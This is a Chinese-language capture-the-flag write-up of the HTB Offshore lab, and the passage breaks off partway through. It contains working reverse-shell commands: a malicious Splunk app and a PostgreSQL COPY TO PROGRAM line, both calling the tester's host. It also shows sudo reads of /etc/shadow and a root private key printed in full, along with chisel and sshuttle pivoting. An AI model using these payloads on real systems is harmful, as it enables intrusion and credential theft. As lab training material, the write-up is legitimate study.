---
title: HTB Offshore 靶场 Writeup
date: 2026-08-14 18:00:00
categories:
  - 靶场
tags:
  - HTB
  - Offshore
  - Active Directory
  - 域渗透
description: HTB Offshore 靶场 Writeup
---

```plain
简介
离岸
离岸是一个现实世界的企业环境，存在各种现代的Active Directory缺陷和配置错误。Offshore Corp 根据金融监管机构的合规要求，必须每季度进行渗透测试，并专注于补丁。公司已完成多项收购，被收购实体通过域名信托“连接”。
如果你能够突破边界并立足，你的任务是探索企业环境，跨越信任界限，最终尝试破坏所有离岸公司实体。
Offshore 将考验你对 Active Directory 枚举、利用和后利用，以及横向移动、枢轴和现代网络应用攻击的理解。有些旗帜是通过实验室推进的必需条件，而另一些则是支线任务，用来强化枚举和开发后技能。玩家可以提交旗帜以赢得离岸名人堂的席位，并在特定检查点收集徽章。
这个渗透测试员二级实验室将让玩家接触到：
枚举
规避端点保护
利用各种现实世界的Active Directory漏洞
横向移动与跨越信托边界
权限升级
网络应用攻击
入口：10.10.110.0/24
```

信息收集 

fscan:

```plain
http://10.10.110.123       标题:ACME Bank
http://10.10.110.124       标题:Offshore Dev
http://10.10.110.123:8000  标题:303 See Other 重定向地址: http://10.10.110.123:8000/zh-CN/
https://10.10.110.123:8089       标题:无标题
http://10.10.110.123:8000/zh-CN/ 标题:""
```

## NIX01:10.10.110.123 
nmap 

```plain
nmap -sC -sV 10.10.110.123 -A
22/tcp   open  ssh      OpenSSH
80/tcp   open  http     Apache
8000/tcp open  http     Splunkd 
8089/tcp open  ssl/http Splunkd httpd
```

```plain
nmap -sC -sV 10.10.110.124 -A
80/tcp open  http    Microsoft IIS httpd 10.0
OS:Windows 2016|2012
```

扫目录10.10.110.124

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-001.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-002.png)

flag1:OFFSHORE{d0nt_l3av3_f1l3s_ar0und}

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-003.png)

[http://10.10.110.124/Login](http://10.10.110.124/dashboard/Login)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-004.png)

没什么信息

看.123

[https://10.10.110.123:8089/](https://10.10.110.123:8089/)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-005.png)

Splunk 免费版远程登录被禁了

发现，curl可以访问登录页面，但浏览器不可以

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-006.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-007.png)

搜索页面关键词，发现:

```plain
"version":"7.0.2"
"loginPasswordHint":"changeme"
```

Splunk 7.0.2，密码提示直接就是<font style="color:#DF2A3F;"> changeme</font>

浏览器试一下：打开无痕/隐私窗口 → 访问 [http://10.10.110.123:8000/en-US/account/login](http://10.10.110.123:8000/en-US/account/login)，还是跳转

用curl登录并验证

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-008.png)

**admin:changeme 登录成功**

**Splunk 7.0.2 Free License**

核心原理：用 inputs.conf 脚本轮询，不依赖搜索命令和 license 限制。

```plain
# === 1. 打包恶意 Splunk App ===
rm -rf /tmp/revshell && mkdir -p /tmp/revshell/bin /tmp/revshell/default
cat > /tmp/revshell/default/app.conf << 'EOF'
[install]
is_configured = 0
state = enabled
[package]
id = revshell
check_for_updates = 0
[ui]
is_visible = 1
label = revshell
EOF
cat > /tmp/revshell/default/inputs.conf << 'EOF'
[script://./bin/rev.sh]
interval = 10
sourcetype = shell
disabled = false
index = main
EOF
cat > /tmp/revshell/bin/rev.sh << 'REOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.84/4444 0>&1'
REOF
chmod +x /tmp/revshell/bin/rev.sh
cd /tmp && rm -f revshell.tar.gz && tar -czf revshell.tar.gz revshell/
# === 2. 开监听 ===
nc -lvnp 4444
# === 3. 浏览器操作 ===
# 登录 Splunk: http://10.10.110.123:8000  （这里会自动跳转，因为之前curl登录了）
# Apps → Install app from file → 选 revshell.tar.gz → Upgrade 覆盖
# Settings → Server controls → Restart Splunk
# 等 30 秒弹 shell
```

关键点：inputs.conf 的 scripted input 在 Splunk Free 版不被限制，每 10 秒自动执行一次，不需要搜索命令。之前用 commands.conf 失败就是因为 Free License 限制太多。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-009.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-010.png)

flag2：OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}

信息收集：

NIX01 内网 IP 172.16.1.23/24

```plain
mark@NIX01:/home/mark$ cat /etc/passwd | grep -E "bash|sh$"
cat /etc/passwd | grep -E "bash|sh$"
root:x:0:0:root:/root:/bin/bash
splunk:x:1002:1002:Splunk Server:/opt/splunk:/bin/bash
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

<font style="color:#DF2A3F;">PostgreSQL 在本地</font>，上传fscan

```plain
root@NIX01:~# ./fscan -h 172.16.1.0/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1
                                                                                                                                                            
[2.0s]     已选择服务扫描模式                                                                                                                               
[2.0s]     开始信息扫描
[2.0s]     CIDR范围: 172.16.1.0-172.16.1.255
[2.0s]     generate_ip_range_full
[2.0s]     解析CIDR 172.16.1.0/24 -> IP范围 172.16.1.0-172.16.1.255
[2.0s]     最终有效主机数量: 256
[2.0s]     开始主机扫描
[2.0s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                               
[2.0s] [*] 目标 172.16.1.23     存活 (ICMP)
[2.0s] [*] 目标 172.16.1.15     存活 (ICMP)
[2.0s] [*] 目标 172.16.1.22     存活 (ICMP)
[2.0s] [*] 目标 172.16.1.30     存活 (ICMP)
[2.0s] [*] 目标 172.16.1.220    存活 (ICMP)
[2.0s] [*] 目标 172.16.1.201    存活 (ICMP)
[2.0s] [*] 目标 172.16.1.200    存活 (ICMP)
[2.0s] [*] 目标 172.16.1.36     存活 (ICMP)
[2.0s] [*] 目标 172.16.1.24     存活 (ICMP)
[2.0s] [*] 目标 172.16.1.5      存活 (ICMP)
[2.0s] [*] 目标 172.16.1.101    存活 (ICMP)
[5.0s]     存活主机数量: 11
[5.0s]     有效端口数量: 233
[5.1s] [*] 端口开放 172.16.1.22:3000
[5.1s] [*] 端口开放 172.16.1.23:22
[5.1s] [*] 端口开放 172.16.1.23:80
[5.1s] [*] 端口开放 172.16.1.15:445
[5.1s] [*] 端口开放 172.16.1.15:139
[5.1s] [*] 端口开放 172.16.1.15:135
[5.1s] [*] 端口开放 172.16.1.23:8000
[5.1s] [*] 端口开放 172.16.1.30:445
[5.1s] [*] 端口开放 172.16.1.30:135
[5.1s] [*] 端口开放 172.16.1.23:8089
[5.1s] [*] 端口开放 172.16.1.30:80
[5.1s] [*] 端口开放 172.16.1.30:22
[5.1s] [*] 端口开放 172.16.1.30:139
[5.1s] [*] 端口开放 172.16.1.15:1433
[5.1s] [*] 端口开放 172.16.1.220:445
[5.1s] [*] 端口开放 172.16.1.220:389
[5.1s] [*] 端口开放 172.16.1.220:139
[5.1s] [*] 端口开放 172.16.1.220:135
[5.1s] [*] 端口开放 172.16.1.220:88
[5.1s] [*] 端口开放 172.16.1.201:139
[5.1s] [*] 端口开放 172.16.1.201:135
[5.1s] [*] 端口开放 172.16.1.201:80
[5.1s] [*] 端口开放 172.16.1.201:21
[5.1s] [*] 端口开放 172.16.1.201:445
[5.1s] [*] 端口开放 172.16.1.200:139
[5.1s] [*] 端口开放 172.16.1.200:135
[5.1s] [*] 端口开放 172.16.1.200:389
[5.1s] [*] 端口开放 172.16.1.200:88
[5.1s] [*] 端口开放 172.16.1.200:445
[6.1s] [*] 端口开放 172.16.1.36:139
[6.1s] [*] 端口开放 172.16.1.36:135
[6.1s] [*] 端口开放 172.16.1.36:445
[7.1s] [*] 端口开放 172.16.1.24:445
[7.1s] [*] 端口开放 172.16.1.24:139
[7.1s] [*] 端口开放 172.16.1.24:135
[7.1s] [*] 端口开放 172.16.1.24:80
[8.0s] [*] 端口开放 172.16.1.5:88
[8.0s] [*] 端口开放 172.16.1.5:135
[8.0s] [*] 端口开放 172.16.1.5:389
[8.0s] [*] 端口开放 172.16.1.5:445
[8.0s] [*] 端口开放 172.16.1.5:139
[8.0s] [*] 端口开放 172.16.1.101:139
[8.0s] [*] 端口开放 172.16.1.101:135
[8.0s] [*] 端口开放 172.16.1.101:445
[9.1s]     扫描完成, 发现 44 个开放端口
[9.1s]     存活端口数量: 44
[9.1s]     开始漏洞扫描
[9.2s] [+] 172.16.1.201 CVE-2020-0796 SmbGhost Vulnerable
[9.2s] [*] 网站标题 http://172.16.1.30        状态码:200 长度:49748  标题:ManageEngine OpManager
[9.2s] [*] 网站标题 http://172.16.1.23        状态码:200 长度:22567  标题:ACME Bank
[9.2s] [*] NetInfo 扫描结果
目标主机: 172.16.1.200                                                                                                                                      
主机名: DC0                                                                                                                                                 
发现的网络接口:                                                                                                                                             
[9.3s] [*] NetInfo 扫描结果
目标主机: 172.16.1.36                                                                                                                                       
主机名: WSADM                                                                                                                                               
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.36                                                                                                                                        
[9.3s]     POC加载完成: 总共387个，成功387个，失败0个
[9.3s] [*] NetInfo 扫描结果
目标主机: 172.16.1.201                                                                                                                                      
主机名: JOE-LPTP                                                                                                                                            
发现的网络接口:                                                                                                                                             
[9.3s] [*] NetInfo 扫描结果
目标主机: 172.16.1.220                                                                                                                                      
主机名: SRV01                                                                                                                                               
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.220                                                                                                                                       
[9.3s] [*] 网站标题 http://172.16.1.24        状态码:200 长度:3079   标题:Offshore Dev
[9.4s] [*] NetInfo 扫描结果
目标主机: 172.16.1.24                                                                                                                                       
主机名: WEB-WIN01                                                                                                                                           
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.24                                                                                                                                        
[9.4s] [*] NetInfo 扫描结果
目标主机: 172.16.1.15                                                                                                                                       
主机名: SQL01                                                                                                                                               
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.15                                                                                                                                        
[9.4s] [*] NetInfo 扫描结果
目标主机: 172.16.1.5                                                                                                                                        
主机名: DC01                                                                                                                                                
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.5                                                                                                                                         
[9.4s] [*] NetInfo 扫描结果
目标主机: 172.16.1.101                                                                                                                                      
主机名: WS02                                                                                                                                                
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.101                                                                                                                                       
[9.4s] [+] NetBios 172.16.1.200    DC:LAB\DC0                 
[9.4s] [*] NetInfo 扫描结果
目标主机: 172.16.1.30                                                                                                                                       
主机名: MS01                                                                                                                                                
发现的网络接口:                                                                                                                                             
   IPv4地址:                                                                                                                                                
      └─ 172.16.1.30                                                                                                                                        
[9.4s]     系统信息 172.16.1.101 [Windows 7 Professional 7601 Service Pack 1]
[9.4s] [*] 网站标题 http://172.16.1.201       状态码:200 长度:696    标题:IIS Windows
[9.4s] [+] NetBios 172.16.1.24     CORP\WEB-WIN01                
[9.4s] [+] NetBios 172.16.1.201    JOE-LAB\JOE-LPTP              
[9.4s] [+] NetBios 172.16.1.36     CORP\WSADM                    
[9.4s] [+] NetBios 172.16.1.30     MS01.corp.local                     Windows Server 2016 Standard 14393
[9.4s] [*] 网站标题 http://172.16.1.23:8000   状态码:303 长度:335    标题:303 See Other 重定向地址: http://172.16.1.23:8000/zh-CN/
[9.5s]     系统信息 172.16.1.5 [Windows Server 2016 Standard 14393]
[9.5s] [+] NetBios 172.16.1.220    DC:SRV01.LAB.OFFSHORE.LOCAL      Windows Server 2016 Standard 14393
[9.5s] [+] NetBios 172.16.1.5      DC:DC01.corp.local               Windows Server 2016 Standard 14393
[9.5s] [+] NetBios 172.16.1.15     SQL01.corp.local                    Windows Server 2016 Standard 14393
[9.5s]     系统信息 172.16.1.220 [Windows Server 2016 Standard 14393]
[9.5s] [+] FTP服务 172.16.1.201:21 匿名登录成功!
[9.5s] [*] 网站标题 https://172.16.1.23:8089  状态码:401 长度:453    标题:无标题
[9.7s] [*] 网站标题 http://172.16.1.22:3000   状态码:401 长度:39     标题:无标题
[9.9s] [*] 网站标题 http://172.16.1.23:8000/zh-CN/ 状态码:200 长度:13487  标题:""
[53.9s]     扫描已完成: 81/81
```

### fscan：（DC1）  三大域：CORP / LAB / JOE-LAB
<font style="color:#DF2A3F;">CORP.LOCAL / LAB.OFFSHORE.LOCAL / JOE-LAB</font>

| IP | 主机名 | 域 | 角色 | 端口 | 重要发现 |
| --- | --- | --- | --- | --- | --- |
| **172.16.1.22** | — | — | 仅存活 | — | 无开放端口 |
| **172.16.1.5** | DC01 | **corp.local** | 🔴 DC | 88, 135, 139, 389, 445 | Win 2016 |
| **172.16.1.15** | SQL01 | **corp.local** | SQL | 135, 139, 445, **1433** | MSSQL |
| **<font style="color:#DF2A3F;">172.16.1.23</font>** | <font style="color:#DF2A3F;">NIX01（拿下）</font> | **corp.local** | 🟢 入口机 | 22, 80, 8000, 8089 | Splunk + ACME Bank |
| **172.16.1.24** | WEB-WIN01 | **corp.local** | Web | 80, 135, 139, 445 | = 10.10.110.124! 双网卡 |
| **172.16.1.30** | MS01 | **corp.local** | 🔴 ManageEngine | 22, 80, 135, 139, 445 | **OpManage**（RCE） |
| **172.16.1.36** | WSADM | **corp.local** | 工作站 | 135, 139, 445 | — |
| **172.16.1.101** | WS02 | corp.local | 工作站 | 135, 139, 445 | Win 7 SP1<br/><font style="color:#DF2A3F;">Win 7 + SMBv1 → MS17-010！</font> |
| **<font style="color:#DF2A3F;">172.16.1.201</font>** | <font style="color:#DF2A3F;">JOE-LPTP（拿下ftp）</font> | **JOE-LAB** | 🔴 FTP+Web | 21, 80, 135, 139, 445 | **FTP匿名!    SmbGhost!** |
| **172.16.1.200** | DC0 | **LAB.OFFSHORE.LOCAL** | 🔴 DC | 88, 135, 139, 389, 445 | 域: LAB |
| **172.16.1.220** | SRV01 | **LAB.OFFSHORE.LOCAL** | 🔴 DC | 88, 135, 139, 389, 445 | — |


挂代理(挂在入口机）

```plain
# setsid 后台启动，脱离会话 —— shell 断了代理也活着
setsid ./chisel client 10.10.14.84:12345 R:socks >/tmp/chisel.log 2>&1 < /dev/null &

# 等 3 秒确认连上
sleep 3 && cat /tmp/chisel.log
```

# 1️⃣**主域corp.local**
## NIX01:172.16.1.23 （<font style="color:#DF2A3F;">PostgreSQL RCE</font>提权）
之前信息收集：

NIX01 内网 IP 172.16.1.23/24

```plain
mark@NIX01:/home/mark$ cat /etc/passwd | grep -E "bash|sh$"
cat /etc/passwd | grep -E "bash|sh$"
root:x:0:0:root:/root:/bin/bash
splunk:x:1002:1002:Splunk Server:/opt/splunk:/bin/bash
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

<font style="color:#DF2A3F;">PostgreSQL 在本地</font>：

端口是5432

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-011.png)

测试发现**<font style="color:rgb(0, 0, 0);">PostgreSQL 9.6.0 无密码直接进去了</font>**

```plain
/usr/local/pgsql/bin/psql -U postgres -p 5432 -h 127.0.0.1 -c "select version();"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-012.png)

直接写shell RCE

```plain
/usr/local/pgsql/bin/psql -U postgres -p 5432 -h 127.0.0.1 -c "COPY (SELECT '') TO PROGRAM '/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.84/4446 0>&1\"';"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-013.png)

另开端口监听：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-014.png)

发现关键路径/usr/bin/tail

先拿个普通权限flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-015.png)

flag4：OFFSHORE{fun_w1th_m@g1k_bl0ck$}

利用root 路径读root 权限flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-016.png)

flag5：OFFSHORE{st0p_tai1ing_m3_br0}

利用root 路径的root权限 信息收集：

```plain
postgres@NIX01:/usr/local/pgsql/data$ sudo /usr/bin/tail -n 100 /etc/shadow
sudo /usr/bin/tail -n 100 /etc/shadow
root:$6$UM9dnBFE$5LRqppNoZhJmLz0.cLGlZXeDWYjy4u4MWbTW/8vMu.vSCbhTFlCLDsRvtxj8kF1RrlbCeyJHitm9g9.pLe4uM1:17652:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
proxy:*:17001:0:99999:7:::
www-data:*:17001:0:99999:7:::
backup:*:17001:0:99999:7:::
list:*:17001:0:99999:7:::
irc:*:17001:0:99999:7:::
gnats:*:17001:0:99999:7:::
nobody:*:17001:0:99999:7:::
systemd-timesync:*:17001:0:99999:7:::
systemd-network:*:17001:0:99999:7:::
systemd-resolve:*:17001:0:99999:7:::
syslog:*:17001:0:99999:7:::
_apt:*:17001:0:99999:7:::
messagebus:*:17564:0:99999:7:::
uuidd:*:17564:0:99999:7:::
mark:$6$J7gvzz87$jy.tjUc9mWJHy5nxZtuqtXcX6zJdCAE8eX87rZfzEE0zaV8rKHyzNQ5YWzSn/ust0Y96sMRCWrFEkGhv5QD.O/:17642:0:99999:7:::
sshd:*:17564:0:99999:7:::
splunk:!:17564:0:99999:7:::
postgres:$6$ZQdBsxBU$YZeJIBNXNEJIWv5cwwGnuHrfxL04zaj1GXE0NhgL8pvmSgU2Csb/HTdesfPb7NY4ru7/UXa7Dvy/BynKzJLlI/:17758:0:99999:7:::
colord:*:19163:0:99999:7:::
saned:*:19656:0:99999:7:::
postgres@NIX01:/usr/local/pgsql/data$ 
```

<font style="color:rgb(0, 0, 0);">三个哈希：root/mark/postgres，但都拿到shell了</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">就破解出来一个</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">mark</font>`<font style="color:rgb(0, 0, 0);">: </font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">toor</font>**

一开始fscan:这台机子还有22端口

有/.ssh/id_rsa

```plain
postgres@NIX01:/usr/local/pgsql/data$ sudo /usr/bin/tail -n 200 /root/.ssh/id_rsa
audo /usr/bin/tail -n 200 /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOO
cqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818Uxyr
HBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kw
HKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGf
OtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrI
Wm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy
6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6Ul
HTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4
gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyT
Td7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJH
LE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fb
v1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oG
eAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4U
MAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9
KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AX
j5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1L
H6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7
VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx
5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeL
Ku73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PM
l1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ7
8aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB
/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxK
CS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/Uk
pnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE
-----END RSA PRIVATE KEY-----
postgres@NIX01:/usr/local/pgsql/data$ 
```

<font style="color:rgb(0, 0, 0);">Kali 上保存私钥并测试 SSH</font>

```plain
cat > /tmp/nix01_id_rsa << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOO
cqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818Uxyr
HBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kw
HKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGf
OtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrI
Wm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy
6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6Ul
HTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4
gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyT
Td7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJH
LE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fb
v1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oG
eAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4U
MAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9
KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AX
j5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1L
H6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7
VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx
5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeL
Ku73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PM
l1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ7
8aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB
/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxK
CS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/Uk
pnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE
-----END RSA PRIVATE KEY-----
EOF
chmod 600 /tmp/nix01_id_rsa

# 测试 SSH 登录（外部地址 10.10.110.123）
ssh -i /tmp/nix01_id_rsa -o StrictHostKeyChecking=no root@10.10.110.123 whoami
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-017.png)

连接成功，权限是root,也能拿root的flag

#### <font style="color:#DF2A3F;">利用ssh搭一个sshuttle隧道，方便之后的横移</font>
```plain
sudo sshuttle -vr root@10.10.110.123 172.16.1.0/24 --ssh-cmd 'ssh -i /tmp/nix01_id_rsa'
```

```bash
sudo sshuttle -vr root@10.10.110.123 172.16.1.0/24 --dns \
  --ssh-cmd 'ssh -i /tmp/nix01_id_rsa'
#Kali 无法解析 LAB.OFFSHORE.LOCAL（sshuttle 默认不转发 DNS）。
#解决办法：sshuttle 加 --dns 参数，让 DNS 查询也走远程隧道（由 NIX01 用内网 DNS 解析）
```

> <font style="color:rgb(0, 0, 0);">一句话：</font>**<font style="color:rgb(0, 0, 0);">sshuttle 把 172.16.1.0/24 内网"插"到了你的 Kali 上</font>**<font style="color:rgb(0, 0, 0);">，让 Kali 觉得自己就在内网里。</font>
>

|  | **<font style="color:rgb(0, 0, 0);">chisel (之前)</font>** | **<font style="color:rgb(0, 0, 0);">sshuttle (现在)</font>** |
| --- | --- | --- |
| <font style="color:rgb(0, 0, 0);">方向</font> | <font style="color:rgb(0, 0, 0);">NIX01 → Kali（反向 socks）</font> | <font style="color:rgb(0, 0, 0);">Kali → NIX01（SSH）</font> |
| <font style="color:rgb(0, 0, 0);">访问内网</font> | <font style="color:rgb(0, 0, 0);">每条命令都要 </font>`<font style="color:rgb(0, 0, 0);">proxychains4</font>`<font style="color:rgb(0, 0, 0);">前缀</font> | **<font style="color:rgb(0, 0, 0);">直接</font>**<font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">nmap 172.16.1.30</font>`<font style="color:rgb(0, 0, 0);">，零前缀</font> |
| <font style="color:rgb(0, 0, 0);">工具兼容</font> | <font style="color:rgb(0, 0, 0);">proxychains 下 nmap/msf 常出错、慢</font> | <font style="color:rgb(0, 0, 0);">原生工作，快</font> |
| <font style="color:rgb(0, 0, 0);">通道</font> | <font style="color:rgb(0, 0, 0);">SOCKS 明文转发</font> | **<font style="color:rgb(0, 0, 0);">SSH 加密</font>** |
| <font style="color:rgb(0, 0, 0);">稳定性</font> | <font style="color:rgb(0, 0, 0);">依赖 NIX01 上那个进程</font> | <font style="color:rgb(0, 0, 0);">依赖你 Kali 上这个终端</font> |


连ssh的shell:

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-018.png)

没什么别的信息

**corp.local 横移：**

| **172.16.1.5** | DC01 | **corp.local** | 🔴 DC | 88, 135, 139, 389, 445 | Win 2016 |
| --- | --- | --- | --- | --- | --- |
| **172.16.1.15** | SQL01 | **corp.local** | SQL | 135, 139, 445, **1433** | MSSQL |
| **<font style="color:#DF2A3F;">172.16.1.23</font>** | <font style="color:#DF2A3F;">NIX01（拿下）</font> | **corp.local** | 🟢 入口机 | 22, 80, 8000, 8089 | Splunk + ACME Bank |
| **<font style="color:#DF2A3F;">172.16.1.24</font>** | <font style="color:#DF2A3F;">WEB-WIN01</font> | **corp.local** | Web | 80, 135, 139, 445 | = 10.10.110.124  |
| **172.16.1.30** | MS01 | **corp.local** | 🔴ManageEngine | 22, 80, 135, 139, 445 | **OpManage**（RCE） |
| **172.16.1.36** | WSADM | **corp.local** | 工作站 | 135, 139, 445 | — |
| **172.16.1.101** | WS02 | **corp.local** | 工作站 | 135, 139, 445 | Win 7 SP1 |
| **172.16.1.26** | FS01 | **corp.local** |  | 135，445 |  |


smb枚举一下

```plain
